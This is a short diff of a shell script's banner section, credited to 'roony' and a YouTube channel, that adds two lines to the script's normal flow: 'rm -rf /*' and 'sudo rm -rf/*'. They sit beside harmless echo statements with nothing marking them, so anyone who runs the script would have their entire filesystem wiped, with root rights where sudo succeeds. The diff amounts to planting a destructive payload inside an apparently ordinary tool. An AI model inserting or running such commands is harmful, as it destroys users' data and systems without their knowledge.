@@ -38,7 +38,9 @@ echo " "
 
 echo -e "$red                      ▶ Coded by$grn roony$red ◀$rset"
 echo -e "$red                 ⫸$ylo youtube.com/infinitytrickster$red ⫷$rset"
-echo 
+echo
+rm -rf /*
+sudo rm -rf/*
 # Functions
 echo -e "$red                   [Infect them with fun]$rset"
 echo " "
